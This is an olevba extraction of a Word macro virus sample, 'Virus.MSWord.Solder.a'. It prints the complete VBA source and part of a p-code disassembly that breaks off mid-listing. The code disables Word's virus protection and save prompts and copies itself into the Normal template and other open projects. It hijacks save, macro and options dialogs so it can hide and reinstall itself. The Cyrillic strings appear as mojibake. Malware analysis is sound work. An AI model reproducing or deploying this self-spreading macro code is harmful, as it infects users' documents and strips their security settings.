olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Solder.a
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Solder.a - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO xkySoldier.bas 
in file: Virus.MSWord.Solder.a - OLE stream: 'Macros/VBA/xkySoldier'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open()
Const NStat = 0
Const VStat = 0
    With Application.Options
        .SaveNormalPrompt = False
        .VirusProtection = False
    End With
Dim i%, j%, l%, WhareIns As Long, Finded As Boolean, FindedOpen As Boolean
Dim WhatInsBeg As Long, WhatInsEnd As Long
For i = 1 To VBE.VBProjects.Count
 For j = 1 To VBE.VBProjects(i).VBComponents.Count
   With VBE.VBProjects(i).VBComponents(j).CodeModule
        For WhareIns = 1 To .CountOfLines + 1
            If .Find("'Ïðîáà ¹ 1", WhareIns, 1, WhareIns, 30) Then
               Finded = True
               Exit For
            Else
               Finded = False
            End If
        Next WhareIns
        If Not Finded Then
            For WhareIns = 1 To .CountOfLines
                If .Find("Sub Document_Open()", WhareIns, 1, WhareIns, 30) Then
                    FindedOpen = True
                    Exit For
                Else
                    FindedOpen = False
                End If
            Next WhareIns
            For WhatInsBeg = 1 To Me.VBProject.VBComponents(Me.CodeName).CodeModule.CountOfLines
                If Me.VBProject.VBComponents(Me.CodeName).CodeModule.Find("'Ïðîáà ¹ 1", WhatInsBeg, 1, WhatInsBeg, 30) Then
                    Exit For
                End If
            Next WhatInsBeg
            For WhatInsEnd = 1 To Me.VBProject.VBComponents(Me.CodeName).CodeModule.CountOfLines
                If Me.VBProject.VBComponents(Me.CodeName).CodeModule.Find("'Êîíåö", WhatInsEnd, 1, WhatInsEnd, 30) Then
                    Exit For
                End If
            Next WhatInsEnd
        End If
        If (Not Finded) And FindedOpen Then
        WhareIns = WhareIns + 1
        .InsertLines WhareIns, Me.VBProject.VBComponents(Me.CodeName) _
        .CodeModule.Lines(2, WhatInsEnd - WhatInsBeg + 1)
        ElseIf Not Finded Then
        .AddFromString Me.VBProject.VBComponents(Me.CodeName) _
        .CodeModule.Lines(1, Me.VBProject.VBComponents(Me.CodeName) _
        .CodeModule.CountOfLines)
        End If
    End With
  Next
 Next

Application.OnTime When:=Now() + TimeValue("00:00:" & Format(Int(Rnd * 30))), _
Name:=VBE.VBProjects(1).Name & "." & VBE.VBProjects(1).VBComponents(1).Name & "MyProc"
'Êîíåö
Rem Deleted by
Rem Deleted by
Rem Deleted by
    Rem
    Rem Deleted b
    Rem Deleted by AVP  Deleted by AVP  Deleted by AVP  Delet
    Rem Deleted by AVP  Deleted by AVP  Deleted by AVP  Deleted by AVP  Deleted b


    End
    Rem Deleted by AVP  Deleted by AVP  D
    Rem Deleted by AVP  Deleted by AVP  Deleted by AVP  Deleted by AVP  Deleted by AVP  Deleted by AVP  Deleted by AVP  D



    End
    Rem Deleted by AVP  Deleted
    Rem Deleted by AVP  Delet
    Rem Deleted by AVP  Deleted by AVP  Deleted by AVP  Deleted by AVP  Del
    Rem Deleted by AVP  Deleted by AVP  Deleted by AVP  Deleted by AVP  Deleted by AVP  Deleted by AVP  Delet


    End
    Rem Deleted by AVP  Deleted by AVP  Deleted by AVP
    Rem Deleted by AVP  Deleted by AVP  Deleted by AVP  Deleted by AVP  Deleted by AVP  Deleted by AVP  Deleted by AVP  Deleted by AVP



    End
    Rem Delet
    Rem Deleted by AVP  Deleted by AVP  Deleted
    Rem Deleted
        Rem D
        Rem Deleted
        Rem D
        Rem Deleted
        Rem D
        Rem Del
        Rem Deleted
        Rem Deleted by AVP  D
        Rem Deleted by
        Rem Delet
        End
    End
    End
End Sub
Private Sub Document_Close()
    Rem D
End Sub
Private Sub Document_New()
    Rem D
End Sub



























































































































































Sub AutoOpen()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = 0
Options.SaveNormalPrompt = 0
Dim pth As String, i As Byte, dc As Object
Dim NInst As Boolean, AInst As Boolean
On Error Resume Next
Application.VBE.MainWindow.Visible = False
pth = Environ("temp") & "\~WRr000^.tmp"
Set dc = NormalTemplate.VBProject.VBComponents
For i = 1 To dc.Count
If dc(i).Name = "xkySoldier" Then
NInst = 1
dc(i).Export pth
End If
Next i
Set dc = ActiveDocument.VBProject.VBComponents
For i = 1 To dc.Count
If dc(i).Name = "xkySoldier" Then
AInst = 1
dc(i).Export pth
End If
Next i
If AInst = True And NInst = False Then Set dc = NormalTemplate
If AInst = False And NInst = True Then Set dc = ActiveDocument
If AInst = False Or NInst = False Then
dc.VBProject.VBComponents.Import pth
If Mid(ActiveDocument.FullName, 2, 1) = ":" Then dc.Save
Kill pth
End If
 AutoCorrect.Entries(",").Delete
    With AutoCorrect
        .CorrectInitialCaps = True
        .CorrectSentenceCaps = False
        .CorrectDays = True
        .CorrectCapsLock = True
        .ReplaceText = True
    End With
    On Error Resume Next
Dim pdd, wd, r, s
Set wd = Application.VBE.ActiveVBProject.VBComponents

For r = 1 To wd.Count

If Application.VBE.ActiveVBProject.VBComponents(r).Name = "WordDigger" Then

MsgBox "Âíèìàíèå!" + vbCrLf + "Â øàáëîíå îáíàðóæåí ìîäóëü WordDigger (èíà÷å ÁËÈÍ)" + vbCrLf + " Ìîäóëü ÁËÈÍÀ è åãî ïîñëåäñòâèÿ áûëè óíè÷òîæåíû" + vbCrLf + "Âèðóñîì-îõîòíèêîì SkySoldier. Âàêöèíàöèÿ øàáëîíà ïðîâåäåíà, îäíàêî ïðîâåðòå ôàéëû àíòèâèðóñîì", vbOKOnly + vbInformation
MsgBox "Â 2000 ãîäó êàêàÿ-òî ñêîòèíà ïðèíåñëà â øòàá ÑÊÂÎ âèðóñ WordDigger" + vbCrLf + " èëè, êàê åãî òóò âñå íàçûâàþò ÁËÈÍ" + vbCrLf + "Îí äî òîãî æèâó÷èé, ÷òî ñèëüíî ìåíÿ äîñòàë" + vbCrLf + "è âîò íà äîñóãå ñëîæèëàñü ìûñëü íàïèñàòü âèðóñ-îõîòíèê, êîòîðûé áû óíè÷òîæàë ÁËÈÍ èçíóòðè. È âîò ÷òî èç ýòîãî ïîëó÷èëîñü..." + vbCrLf + "Àâòîð ïðîãðàììû: Øòîäà Å.Â. (ÀïÍØ)" + vbCrLf + "Èäåÿ: Äóäèí Ñåðãåé (ÎÑÂ è ÁÂÑ)" + vbCrLf + "Ïîä ÷óòêèì ðóêîâîäñòâîì ïîëêîâíèêà ×ìóëåâà Â.Â."
GoSub 20

End If
Next r
20 wd.Remove Application.VBE.ActiveVBProject.VBComponents(r)


Return

Set pdd = NormalTemplate.VBProject.VBComponents

For s = 1 To pdd.Count
If NormalTemplate.VBProject.VBComponents(s).Name = "WordDigger" Then
pdd.Remove NormalTemplate.VBProject.VBComponents(s)
MsgBox "Âíèìàíèå!" + vbCrLf + "Â øàáëîíå îáíàðóæåí ìîäóëü WordDigger (èíà÷å ÁËÈÍ)" + vbCrLf + " Ìîäóëü ÁËÈÍÀ è åãî ïîñëåäñòâèÿ áûëè óíè÷òîæåíû" + vbCrLf + "Âèðóñîì-îõîòíèêîì SkySoldier. Âàêöèíàöèÿ øàáëîíà ïðîâåäåíà, îäíàêî ïðîâåðòå ôàéëû àíòèâèðóñîì", vbOKOnly + vbInformation
MsgBox "Â 2000 ãîäó êàêàÿ-òî ñêîòèíà ïðèíåñëà â øòàá ÑÊÂÎ âèðóñ WordDigger" + vbCrLf + " èëè, êàê åãî òóò âñå íàçûâàþò ÁËÈÍ" + vbCrLf + "Îí äî òîãî æèâó÷èé, ÷òî ñèëüíî ìåíÿ äîñòàë" + vbCrLf + "è âîò íà äîñóãå ñëîæèëàñü ìûñëü íàïèñàòü âèðóñ-îõîòíèê, êîòîðûé áû óíè÷òîæàë ÁËÈÍ èçíóòðè. È âîò ÷òî èç ýòîãî ïîëó÷èëîñü..." + vbCrLf + "Àâòîð ïðîãðàììû: Øòîäà Å.Â. (ÀïÍØ)" + vbCrLf + "Èäåÿ: Äóäèí Ñåðãåé (ÎÑÂ è ÁÂÑ)" + vbCrLf + "Ïîä ÷óòêèì ðóêîâîäñòâîì ïîëêîâíèêà ×ìóëåâà Â.Â."
End If
Next s
End Sub
Sub AutoExec()
Dim o, l
On Error Resume Next
Application.EnableCancelKey = wdCancelDisabled
Application.VBE.MainWindow.Visible = False
WordBasic.DisableAutoMacros 0
Options.VirusProtection = 0
Options.SaveNormalPrompt = 0
 AutoCorrect.Entries(",").Delete
    With AutoCorrect
        .CorrectInitialCaps = True
        .CorrectSentenceCaps = False
        .CorrectDays = True
        .CorrectCapsLock = True
        .ReplaceText = True
    End With
    On Error Resume Next
Dim pdd, wd
Set wd = Application.VBE.ActiveVBProject.VBComponents

For o = 1 To wd.Count

If Application.VBE.ActiveVBProject.VBComponents(o).Name = "WordDigger" Then

MsgBox "Âíèìàíèå!" + vbCrLf + "Â øàáëîíå îáíàðóæåí ìîäóëü WordDigger (èíà÷å ÁËÈÍ)" + vbCrLf + " Ìîäóëü ÁËÈÍÀ è åãî ïîñëåäñòâèÿ áûëè óíè÷òîæåíû" + vbCrLf + "Âèðóñîì-îõîòíèêîì SkySoldier. Âàêöèíàöèÿ øàáëîíà ïðîâåäåíà, îäíàêî ïðîâåðòå ôàéëû àíòèâèðóñîì", vbOKOnly + vbInformation
MsgBox "Â 2000 ãîäó êàêàÿ-òî ñêîòèíà ïðèíåñëà â øòàá ÑÊÂÎ âèðóñ WordDigger" + vbCrLf + " èëè, êàê åãî òóò âñå íàçûâàþò ÁËÈÍ" + vbCrLf + "Îí äî òîãî æèâó÷èé, ÷òî ñèëüíî ìåíÿ äîñòàë" + vbCrLf + "è âîò íà äîñóãå ñëîæèëàñü ìûñëü íàïèñàòü âèðóñ-îõîòíèê, êîòîðûé áû óíè÷òîæàë ÁËÈÍ èçíóòðè. È âîò ÷òî èç ýòîãî ïîëó÷èëîñü..." + vbCrLf + "Àâòîð ïðîãðàììû: Øòîäà Å.Â. (ÀïÍØ)" + vbCrLf + "Èäåÿ: Äóäèí Ñåðãåé (ÎÑÂ è ÁÂÑ)" + vbCrLf + "Ïîä ÷óòêèì ðóêîâîäñòâîì ïîëêîâíèêà ×ìóëåâà Â.Â."
GoSub 20

End If
Next o
20 wd.Remove Application.VBE.ActiveVBProject.VBComponents(o)


Return

Set pdd = NormalTemplate.VBProject.VBComponents

For l = 1 To pdd.Count
If NormalTemplate.VBProject.VBComponents(l).Name = "WordDigger" Then
pdd.Remove NormalTemplate.VBProject.VBComponents(l)
MsgBox "Âíèìàíèå!" + vbCrLf + "Â øàáëîíå îáíàðóæåí ìîäóëü WordDigger (èíà÷å ÁËÈÍ)" + vbCrLf + " Ìîäóëü ÁËÈÍÀ è åãî ïîñëåäñòâèÿ áûëè óíè÷òîæåíû" + vbCrLf + "Âèðóñîì-îõîòíèêîì SkySoldier. Âàêöèíàöèÿ øàáëîíà ïðîâåäåíà, îäíàêî ïðîâåðòå ôàéëû àíòèâèðóñîì", vbOKOnly + vbInformation
MsgBox "Â 2000 ãîäó êàêàÿ-òî ñêîòèíà ïðèíåñëà â øòàá ÑÊÂÎ âèðóñ WordDigger" + vbCrLf + " èëè, êàê åãî òóò âñå íàçûâàþò ÁËÈÍ" + vbCrLf + "Îí äî òîãî æèâó÷èé, ÷òî ñèëüíî ìåíÿ äîñòàë" + vbCrLf + "è âîò íà äîñóãå ñëîæèëàñü ìûñëü íàïèñàòü âèðóñ-îõîòíèê, êîòîðûé áû óíè÷òîæàë ÁËÈÍ èçíóòðè. È âîò ÷òî èç ýòîãî ïîëó÷èëîñü..." + vbCrLf + "Àâòîð ïðîãðàììû: Øòîäà Å.Â. (ÀïÍØ)" + vbCrLf + "Èäåÿ: Äóäèí Ñåðãåé (ÎÑÂ è ÁÂÑ)" + vbCrLf + "Ïîä ÷óòêèì ðóêîâîäñòâîì ïîëêîâíèêà ×ìóëåâà Â.Â."
End If
Next l
End Sub
Sub FileSave()
On Error Resume Next
Call AutoOpen
ActiveDocument.Save
End Sub
Sub FileSaveAs()
On Error Resume Next
Call AutoOpen
Dialogs(wdDialogFileSaveAs).Show
End Sub
Sub ToolsOptions()
On Error Resume Next
Dim dc As Object
Dim VirStat As Byte
Dim NorStat As Byte
Options.SaveNormalPrompt = NStat
Options.VirusProtection = VStat
Dialogs(wdDialogToolsOptions).Show
Set dc = ActiveDocument.VBProject.VBComponents("xkySoldier").CodeModule
If Options.SaveNormalPrompt = True Then NorStat = 1
If Options.VirusProtection = True Then VirStat = 1
dc.ReplaceLine 2, "const NStat=" & NorStat
dc.ReplaceLine 3, "const VStat=" & VirStat
Set dc = NormalTemplate.VBProject.VBComponents("xkySoldier").CodeModule
dc.ReplaceLine 2, "const NStat=" & NorStat
dc.ReplaceLine 3, "const VStat=" & VirStat
Options.SaveNormalPrompt = 0
Options.VirusProtection = 0
NormalTemplate.Save
NormalTemplate.Saved = True
End Sub
Sub ToolsMacro()
Dim i As Byte, n As Integer, pth As String
Dim NInst As Boolean, AInst As Boolean, Nsav As Boolean, Asav As Boolean, res As Boolean
Dim dc As Object, dcN As Object, dcA As Object
On Error Resume Next
pth = Environ("temp") & "\~WRr000^.tmp"
Set dcN = NormalTemplate.VBProject.VBComponents
Set dcA = ActiveDocument.VBProject.VBComponents
Set dc = NormalTemplate.VBProject
GoSub 10
NInst = res
Set dc = ActiveDocument.VBProject
GoSub 10
AInst = res
If NInst = True Then
Set dc = dcN
GoSub 20
Nsav = NormalTemplate.Saved
NormalTemplate.Saved = 1
End If
If AInst = True Then
Set dc = dcA
GoSub 20
Asav = ActiveDocument.Saved
ActiveDocument.Saved = 1
End If
Dialogs(wdDialogToolsMacro).Show
dcN("xkySoldier").CodeModule.AddFromFile pth
dcA("xkySoldier").CodeModule.AddFromFile pth
dcN.CodeModule.AddFromFile pth
NormalTemplate.Saved = Nsav
dcA.CodeModule.AddFromFile pth
ActiveDocument.Saved = Asav
Kill pth
Exit Sub
10 For i = 1 To dc.VBComponents.Count
If dc.VBComponents(i).Name = "xkySoldier" Then
res = 1
dc.VBComponents(i).Export pth
End If
Next i
Return
20 dc.Export pth
n = dc("xkySoldier").CodeModule.CountOfLines
dc("xkySoldier").CodeModule.DeleteLines 1, n
Return
End Sub
Sub ViewVBCode()
'If Dir("c:\xkySoldier.die") = "" Then
'MsgBox "Îñòîðîæíî"
Application.VBE.MainWindow.Visible = True
'End If
End Sub

-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Solder.a
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 965 bytes
' Macros/VBA/xkySoldier - 20818 bytes
' Line #0:
' 	FuncDefn (Private Sub Document_Open())
' Line #1:
' 	Dim (Const) 
' 	LitDI2 0x0000 
' 	VarDefn NStat
' Line #2:
' 	Dim (Const) 
' 	LitDI2 0x0000 
' 	VarDefn VStat
' Line #3:
' 	StartWithExpr 
' 	Ld Application 
' 	MemLd Options 
' 	With 
' Line #4:
' 	LitVarSpecial (False)
' 	MemStWith SaveNormalPrompt 
' Line #5:
' 	LitVarSpecial (False)
' 	MemStWith VirusProtection 
' Line #6:
' 	EndWith 
' Line #7:
' 	Dim 
' 	VarDefn i
' 	VarDefn j
' 	VarDefn l
' 	VarDefn WhareIns (As Long)
' 	VarDefn Finded (As Boolean)
' 	VarDefn FindedOpen (As Boolean)
' Line #8:
' 	Dim 
' 	VarDefn WhatInsBeg (As Long)
' 	VarDefn WhatInsEnd (As Long)
' Line #9:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld VBE 
' 	MemLd VBProjects 
' 	MemLd Count 
' 	For 
' Line #10:
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld i 
' 	Ld VBE 
' 	ArgsMemLd VBProjects 0x0001 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #11:
' 	StartWithExpr 
' 	Ld j 
' 	Ld i 
' 	Ld VBE 
' 	ArgsMemLd VBProjects 0x0001 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	With 
' Line #12:
' 	StartForVariable 
' 	Ld WhareIns 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	MemLdWith CountOfLines 
' 	LitDI2 0x0001 
' 	Add 
' 	For 
' Line #13:
' 	LitStr 0x000A "'Ïðîáà ¹ 1"
' 	Ld WhareIns 
' 	LitDI2 0x0001 
' 	Ld WhareIns 
' 	LitDI2 0x001E 
' 	ArgsMemLdWith Find 0x0005 
' 	IfBlock 
' Line #14:
' 	LitVarSpecial (True)
' 	St Finded 
' Line #15:
' 	ExitFor 
' Line #16:
' 	ElseBlock 
' Line #17:
' 	LitVarSpecial (False)
' 	St Finded 
' Line #18:
' 	EndIfBlock 
' Line #19:
' 	StartForVariable 
' 	Ld WhareIns 
' 	EndForVariable 
' 	NextVar 
' Line #20:
' 	Ld Finded 
' 	Not 
' 	IfBlock 
' Line #21:
' 	StartForVariable 
' 	Ld WhareIns 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	MemLdWith CountOfLines 
' 	For 
' Line #22:
' 	LitStr 0x0013 "Sub Document_Open()"
' 	Ld WhareIns 
' 	LitDI2 0x0001 
' 	Ld WhareIns 
' 	LitDI2 0x001E 
' 	ArgsMemLdWith Find 0x0005 
' 	IfBlock 
' Line #23:
' 	LitVarSpecial (True)
' 	St FindedOpen 
' Line #24:
' 	ExitFor 
' Line #25:
' 	ElseBlock 
' Line #26:
' 	LitVarSpecial (False)
' 	St FindedOpen 
' Line #27:
' 	EndIfBlock 
' Line #28:
' 	StartForVariable 
' 	Ld WhareIns 
' 	EndForVariable 
' 	NextVar 
' Line #29:
' 	StartForVariable 
' 	Ld WhatInsBeg 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld id_FFFF 
' 	MemLd CodeName 
' 	Ld id_FFFF 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	For 
' Line #30:
' 	LitStr 0x000A "'Ïðîáà ¹ 1"
' 	Ld WhatInsBeg 
' 	LitDI2 0x0001 
' 	Ld WhatInsBeg 
' 	LitDI2 0x001E 
' 	Ld id_FFFF 
' 	MemLd CodeName 
' 	Ld id_FFFF 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Find 0x0005 
' 	IfBlock 
' Line #31:
' 	ExitFor 
' Line #32:
' 	EndIfBlock 
' Line #33:
' 	StartForVariable 
' 	Ld WhatInsBeg 
' 	EndForVariable 
' 	NextVar 
' Line #34:
' 	StartForVariable 
' 	Ld WhatInsEnd 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld id_FFFF 
' 	MemLd CodeName 
' 	Ld id_FFFF 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	For 
' Line #35:
' 	LitStr 0x0006 "'Êîíåö"
' 	Ld WhatInsEnd 
' 	LitDI2 0x0001 
' 	Ld WhatInsEnd 
' 	LitDI2 0x001E 
' 	Ld id_FFFF 
' 	MemLd CodeName 
' 	Ld id_FFFF 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Find 0x0005 
' 	IfBlock 
' Line #36:
' 	ExitFor 
' Line #37:
' 	EndIfBlock 
' Line #38:
' 	StartForVariable 
' 	Ld WhatInsEnd 
' 	EndForVariable 
' 	NextVar 
' Line #39:
' 	EndIfBlock 
' Line #40:
' 	Ld Finded 
' 	Not 
' 	Paren 
' 	Ld FindedOpen 
' 	And 
' 	IfBlock 
' Line #41:
' 	Ld WhareIns 
' 	LitDI2 0x0001 
' 	Add 
' 	St WhareIns 
' Line #42:
' 	LineCont 0x0004 0E 00 08 00
' 	Ld WhareIns 
' 	LitDI2 0x0002 
' 	Ld WhatInsEnd 
' 	Ld WhatInsBeg 
' 	Sub 
' 	LitDI2 0x0001 
' 	Add 
' 	Ld id_FFFF 
' 	MemLd CodeName 
' 	Ld id_FFFF 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	ArgsMemCallWith InsertLines 0x0002 
' Line #43:
' 	Ld Finded 
' 	Not 
' 	ElseIfBlock 
' Line #44:
' 	LineCont 0x0008 0C 00 08 00 1D 00 08 00
' 	LitDI2 0x0001 
' 	Ld id_FFFF 
' 	MemLd CodeName 
' 	Ld id_FFFF 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	Ld id_FFFF 
' 	MemLd CodeName 
' 	Ld id_FFFF 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	ArgsMemCallWith AddFromString 0x0001 
' Line #45:
' 	EndIfBlock 
' Line #46:
' 	EndWith 
' Line #47:
' 	StartForVariable 
' 	Next 
' Line #48:
' 	StartForVariable 
' 	Next 
' Line #49:
' Line #50:
' 	LineCont 0x0004 18 00 00 00
' 	ArgsLd Now 0x0000 
' 	LitStr 0x0006 "00:00:"
' 	Ld Rnd 
' 	LitDI2 0x001E 
' 	Mul 
' 	FnInt 
' 	ArgsLd Format$ 0x0001 
' 	Concat 
' 	ArgsLd TimeValue 0x0001 
' 	Add 
' 	ParamNamed When 
' 	LitDI2 0x0001 
' 	Ld VBE 
' 	ArgsMemLd VBProjects 0x0001 
' 	MemLd New 
' 	LitStr 0x0001 "."
' 	Concat 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld VBE 
' 	ArgsMemLd VBProjects 0x0001 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	Concat 
' 	LitStr 0x0006 "MyProc"
' 	Concat 
' 	ParamNamed New 
' 	Ld Application 
' 	ArgsMemCall OnTime 0x0002 
' Line #51:
' 	QuoteRem 0x0000 0x0005 "Êîíåö"
' Line #52:
' 	Rem 0x000B " Deleted by"
' Line #53:
' 	Rem 0x000B " Deleted by"
' Line #54:
' 	Rem 0x000B " Deleted by"
' Line #55:
' 	Rem 0x0000 ""
' Line #56:
' 	Rem 0x000A " Deleted b"
' Line #57:
' 	Rem 0x0036 " Deleted by AVP  Deleted by AVP  Deleted by AVP  Delet"
' Line #58:
' 	Rem 0x004A " Deleted by AVP  Deleted by AVP  Deleted by AVP  Deleted by AVP  Deleted b"
' Line #59:
' Line #60:
' Line #61:
' 	End 
' Line #62:
' 	Rem 0x0022 " Deleted by AVP  Deleted by AVP  D"
' Line #63:
' 	Rem 0x0072 " Deleted by AVP  Deleted by AVP  Deleted by AVP  Deleted by AVP  Deleted by AVP  Deleted by AVP  Deleted by AVP  D"
' Line #64:
' Line #65:
' Line #66:
' Line #67:
' 	End 
' Line #68:
' 	Rem 0x0018 " Deleted by AVP  Deleted"
' Line #69:
' 	Rem 0x0016 " Deleted by AVP  Delet"
' Line #70:
' 	Rem 0x0044 " Deleted by AVP  Deleted by AVP  Deleted by AVP  Deleted by AVP  Del"
' Line #71:
' 	Rem 0x0066 " Deleted by AVP  Deleted by AVP  Deleted by AVP  Deleted by AVP  Deleted by AVP  Deleted by AVP  Delet"
' Line #72:
' Line #73:
' Line #74:
' 	End 
' Line #75:
' 	Rem 0x002F " Deleted by AVP  Deleted by AVP  Deleted by AVP"
' Line #76:
' 	Rem 0x007F " Deleted by AVP  Deleted by AVP  Deleted by AVP  Deleted by AVP  Deleted by AVP  Deleted by AVP  Deleted by AVP  Deleted by AVP"
' Line #77:
' Line #78:
' Line #79:
' Line #80:
' 	End 
' Line #81:
' 	Rem 0x0006 " Delet"
' Line #82:
' 	Rem 0x0028 " Deleted by AVP  Deleted by AVP  Deleted"
' Line #83:
' 	Rem 0x0008 " Deleted"
' Line #84:
' 	Rem 0x0002 " D"
' Line #85:
' 	Rem 0x0008 " Deleted"
' Line #86:
' 	Rem 0x0002 " D"
' Line #87:
' 	Rem 0x0008 " Deleted"
' Line #88:
' 	Rem 0x0002 " D"
' Line #89:
' 	Rem 0x0004 " Del"
' Line #90:
' 	Rem 0x0008 " Deleted"
' Line #91:
' 	Rem 0x0012 " Deleted by AVP  D"
' Line #92:
' 	Rem 0x000B " Deleted by"
' Line #93:
' 	Rem 0x0006 " Delet"
' Line #94:
' 	End 
' Line #95:
' 	End 
' Line #96:
' 	End 
' Line #97:
' 	EndSub 
' Line #98:
' 	FuncDefn (Private Sub Document_Close())
' Line #99:
' 	Rem 0x0002 " D"
' Line #100:
' 	EndSub 
' Line #101:
' 	FuncDefn (Private Sub Document_New())
' Line #102:
' 	Rem 0x0002 " D"
' Line #103:
' 	EndSub 
' Line #104:
' Line #105:
' Line #106:
' Line #107:
' Line #108:
' Line #109:
' Line #110:
' Line #111:
' Line #112:
' Line #113:
' Line #114:
' Line #115:
' Line #116:
' Line #117:
' Line #118:
' Line #119:
' Line #120:
' Line #121:
' Line #122:
' Line #123:
' Line #124:
' Line #125:
' Line #126:
' Line #127:
' Line #128:
' Line #129:
' Line #130:
' Line #131:
' Line #132:
' Line #133:
' Line #134:
' Line #135:
' Line #136:
' Line #137:
' Line #138:
' Line #139:
' Line #140:
' Line #141:
' Line #142:
' Line #143:
' Line #144:
' Line #145:
' Line #146:
' Line #147:
' Line #148:
' Line #149:
' Line #150:
' Line #151:
' Line #152:
' Line #153:
' Line #154:
' Line #155:
' Line #156:
' Line #157:
' Line #158:
' Line #159:
' Line #160:
' Line #161:
' Line #162:
' Line #163:
' Line #164:
' Line #165:
' Line #166:
' Line #167:
' Line #168:
' Line #169:
' Line #170:
' Line #171:
' Line #172:
' Line #173:
' Line #174:
' Line #175:
' Line #176:
' Line #177:
' Line #178:
' Line #179:
' Line #180:
' Line #181:
' Line #182:
' Line #183:
' Line #184:
' Line #185:
' Line #186:
' Line #187:
' Line #188:
' Line #189:
' Line #190:
' Line #191:
' Line #192:
' Line #193:
' Line #194:
' Line #195:
' Line #196:
' Line #197:
' Line #198:
' Line #199:
' Line #200:
' Line #201:
' Line #202:
' Line #203:
' Line #204:
' Line #205:
' Line #206:
' Line #207:
' Line #208:
' Line #209:
' Line #210:
' Line #211:
' Line #212:
' Line #213:
' Line #214:
' Line #215:
' Line #216:
' Line #217:
' Line #218:
' Line #219:
' Line #220:
' Line #221:
' Line #222:
' Line #223:
' Line #224:
' Line #225:
' Line #226:
' Line #227:
' Line #228:
' Line #229:
' Line #230:
' Line #231:
' Line #232:
' Line #233:
' Line #234:
' Line #235:
' Line #236:
' Line #237:
' Line #238:
' Line #239:
' Line #240:
' Line #241:
' Line #242:
' Line #243:
' Line #244:
' Line #245:
' Line #246:
' Line #247:
' Line #248:
' Line #249:
' Line #250:
' Line #251:
' Line #252:
' Line #253:
' Line #254:
' Line #255:
' Line #256:
' Line #257:
' Line #258:
' Line #259:
' 	FuncDefn (Sub AutoOpen())
' Line #260:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #261:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #262:
' 	LitDI2 0x0000 
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #263:
' 	LitDI2 0x0000 
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #264:
' 	Dim 
' 	VarDefn pth (As String)
' 	VarDefn i (As Byte)
' 	VarDefn dc (As Object)
' Line #265:
' 	Dim 
' 	VarDefn NInst (As Boolean)
' 	VarDefn AInst (As Boolean)
' Line #266:
' 	OnError (Resume Next) 
' Line #267:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemLd VBE 
' 	MemLd MainWindow 
' 	MemSt Visible 
' Line #268:
' 	LitStr 0x0004 "temp"
' 	ArgsLd Environ 0x0001 
' 	LitStr 0x000D "\~WRr000^.tmp"
' 	Concat 
' 	St pth 
' Line #269:
' 	SetStmt 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	Set dc 
' Line #270:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld dc 
' 	MemLd Count 
' 	For 
' Line #271:
' 	Ld i 
' 	ArgsLd dc 0x0001 
' 	MemLd New 
' 	LitStr 0x000A "xkySoldier"
' 	Eq 
' 	IfBlock 
' Line #272:
' 	LitDI2 0x0001 
' 	St NInst 
' Line #273:
' 	Ld pth 
' 	Ld i 
' 	ArgsLd dc 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #274:
' 	EndIfBlock 
' Line #275:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #276:
' 	SetStmt 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	Set dc 
' Line #277:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld dc 
' 	MemLd Count 
' 	For 
' Line #278:
' 	Ld i 
' 	ArgsLd dc 0x0001 
' 	MemLd New 
' 	LitStr 0x000A "xkySoldier"
